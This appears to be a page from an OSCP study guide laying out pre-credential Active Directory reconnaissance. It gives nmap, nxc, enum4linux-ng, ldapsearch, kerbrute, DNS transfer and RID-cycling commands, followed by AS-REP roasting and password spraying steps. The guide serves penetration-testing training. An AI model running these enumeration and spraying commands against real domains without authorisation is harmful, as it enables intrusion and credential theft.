title: AD Unauthenticated Enumeration — Pre-Credential Recon
body:
Most PEN-200 labs hand you a credential (assumed breach). Real engagements and some OSCP boxes don't. This is the workflow for the moment you can ping the DC but have no creds yet.

The goal is: identify the DC, enumerate the domain, get a usernames list, then either spray for credentials or move to AS-REP roasting / cred reuse from other sources.

In order, what to check:

  1. Ping sweep / nmap host discovery — find the DC and member servers
  2. Service scan all live hosts — fingerprint Windows hosts, find LDAP/Kerberos
  3. SMB null/guest sweep — sometimes returns shares anonymously
  4. enum4linux-ng — wraps multiple SMB/LDAP/RPC enum techniques
  5. LDAP anonymous bind — most DCs deny, but worth 30 seconds
  6. kerbrute userenum — the reliable username enumerator

This is the order because it goes loud → quiet (in detection terms), and cheap → expensive. Don't skip kerbrute — it's the one that consistently returns usernames where everything else returns 'access denied'.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — HOST DISCOVERY (find the DC and friends)
# ══════════════════════════════════════════════════
sudo nmap -sn 192.168.x.0/24 -oG - | awk '/Up$/{print $2}' | tee live_hosts.txt

# If ping is blocked, try TCP ping on common Windows ports:
sudo nmap -PS445,3389,88 -sn 192.168.x.0/24 -oG - | awk '/Up$/{print $2}' | tee live_hosts.txt

# ══════════════════════════════════════════════════
# STEP 2 — SERVICE SCAN — IDENTIFY THE DC
# ══════════════════════════════════════════════════
sudo nmap -sV -sC -iL live_hosts.txt -oN ad_services.txt

# Look for these markers to identify the DC:
#   88/tcp   kerberos-sec    Microsoft Windows Kerberos     ← THE telltale sign
#   389/tcp  ldap            Microsoft Windows Active Directory LDAP (Domain: corp.com)
#   636/tcp  ldapssl
#   3268/tcp ldap            Global Catalog
#   464/tcp  kpasswd
#
# The 'Domain: corp.com' field in LDAP output is your domain name. Capture it.
export dc_ip=192.168.x.70                              # save it
export domain=corp.com

# Faster targeted DC scan:
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sV $dc_ip

# ══════════════════════════════════════════════════
# STEP 3 — SMB NULL/GUEST AUTH SWEEP
# ══════════════════════════════════════════════════
# All hosts get tested. DCs sometimes accept null auth for limited info.
nxc smb live_hosts.txt -u "" -p ""
# Look for: '[+] corp.com\:' (null auth accepted)
# Or:       '(Null Auth:True)' in the banner — possible info leak

# Guest auth (rare but try):
nxc smb live_hosts.txt -u 'guest' -p ''

# If null auth on DC, enumerate domain users directly:
nxc smb $dc_ip -u "" -p "" --users
nxc smb $dc_ip -u "" -p "" --groups
nxc smb $dc_ip -u "" -p "" --shares
nxc smb $dc_ip -u "" -p "" --pass-pol             # lockout policy — read BEFORE spraying!

# ══════════════════════════════════════════════════
# STEP 4 — ENUM4LINUX-NG (kitchen sink)
# ══════════════════════════════════════════════════
enum4linux-ng -A -u "" -p "" $dc_ip

# Useful even when most queries fail — confirms:
#   - Domain SID (S-1-5-21-...)         ← needed for silver tickets
#   - Domain name and FQDN
#   - SMB dialects supported
#   - Whether null auth gives ANYTHING
#
# Expect most checks to return ACCESS_DENIED on a hardened DC. That's fine —
# the SID alone is valuable.

# ══════════════════════════════════════════════════
# STEP 5 — LDAP ANONYMOUS BIND (usually denied, worth 30s)
# ══════════════════════════════════════════════════
ldapsearch -x -h $dc_ip -s base namingcontexts                    # discover naming contexts
ldapsearch -x -h $dc_ip -b "dc=corp,dc=com"                       # full anonymous query
ldapsearch -x -h $dc_ip -b "dc=corp,dc=com" '(objectclass=user)' samaccountname

# If you get 'success' / 'no such object', anonymous bind is allowed — rare but happens.
# If 'Operations error / 000004DC: LdapErr', anonymous bind is denied (expected).

# windapsearch is also good (slower but more readable output):
python3 windapsearch.py --dc-ip $dc_ip -u '' -p '' --users

# ══════════════════════════════════════════════════
# STEP 6 — KERBRUTE USERENUM (the reliable one)
# ══════════════════════════════════════════════════
# This is what works when all else fails. See kerbrute node for full options.

# Quick first pass with small list:
kerbrute userenum --dc $dc_ip -d $domain \
  /usr/share/seclists/Usernames/Names/names.txt \
  -o valid_users.txt

# Bigger list if first pass thin:
kerbrute userenum --dc $dc_ip -d $domain \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt

# OSCP+ trick — use naming-convention permutations from a name list:
git clone https://github.com/insidetrust/statistically-likely-usernames.git
kerbrute userenum --dc $dc_ip -d $domain \
  statistically-likely-usernames/jsmith.txt -o valid.txt

# ══════════════════════════════════════════════════
# STEP 7 — DNS ZONE TRANSFER (free win when it works)
# ══════════════════════════════════════════════════
# Many DCs run DNS. Try AXFR — it's almost always denied on prod but lab
# AD boxes sometimes leave it open.
dig axfr @$dc_ip $domain
dig axfr @$dc_ip _msdcs.$domain                    # AD-specific subzone

# Reverse lookups on the AD subnet — often reveals host naming:
for ip in 192.168.x.{1..254}; do
    host $ip $dc_ip 2>/dev/null | grep -v 'not found' | head -1
done

# ══════════════════════════════════════════════════
# STEP 8 — RID CYCLING (if you have ANY valid cred, even guest)
# ══════════════════════════════════════════════════
# If guest or a low-priv cred works, RID cycling pulls every user:
nxc smb $dc_ip -u 'guest' -p '' --rid-brute 4000

# Or with impacket lookupsid:
impacket-lookupsid 'corp.com/guest:'@$dc_ip 4000

# ══════════════════════════════════════════════════
# WHAT TO DO WITH YOUR VALID USERNAMES
# ══════════════════════════════════════════════════
# 1. AS-REP roast every one — if any have pre-auth disabled, you win:
impacket-GetNPUsers -dc-ip $dc_ip -no-pass -usersfile valid_users.txt corp.com/
#    See: asrep_roast node

# 2. Password spray with kerbrute (CHECK LOCKOUT POLICY FIRST):
kerbrute passwordspray --dc $dc_ip -d $domain valid_users.txt 'Welcome2024!'
#    See: ad_spray node

# 3. Check for previously-leaked passwords from public dumps:
#    haveibeenpwned API, internal threat intel — outside OSCP scope but real-world common
warn: Lockout panic kills exams. The default AD lockout is 5 failed attempts in 30 minutes = account locked. nxc smb $dc_ip --pass-pol (once you have any cred) tells you the actual policy. With no cred, assume 5/30 and spray ONE password per pass, wait 30 minutes between sprays. Userenum (Kerberos) doesn't count as failed logons; only passwordspray and SMB-based attempts do.

choices.label: Got valid usernames — try password spraying
Got a credential — pivot to authenticated enum
Need username enum specifics — kerbrute deep dive
Got nothing — try DNS / SMB / LDAP enum again with different angle
Need foundational AD auth concepts first
Check user description fields for leaked creds
